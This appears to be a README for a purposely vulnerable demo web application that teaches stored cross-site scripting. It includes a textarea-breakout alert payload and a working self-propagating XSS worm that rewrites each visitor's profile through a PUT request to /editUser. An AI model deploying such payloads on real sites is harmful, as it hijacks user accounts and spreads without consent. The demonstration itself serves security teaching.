# Cross-site scripting demonstration

This web application is only used for XSS demonstration, hence its modest appearance

Login -> Edit user -> put the code below in the "Introduction", this will cause an alert to show up everytime a user visit your profile

```html
</textarea> <script>alert("hehe");</script>
```

This will cause an alert to show up everytime a user visit your profile, and copy its entire code to that user's Introduction, making it a self-propagating worm

```html
</textarea>
<script id="worm">
    alert("hehe");

    var headerTag = '<script id="worm">';
    var jsCode = document.getElementById("worm").innerHTML;
    var tailTag = "</" + "script>"; // splitting up the tag to prevent the worm code from ending here
    var wormCode = "</textarea>" + headerTag + jsCode + tailTag;
    window.onload = function () {
        var updatedUser = {
            introduction: wormCode
        };
        var xhr = new XMLHttpRequest();
        xhr.open("PUT", "/editUser", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.send(JSON.stringify(updatedUser));
    };
</script>
```
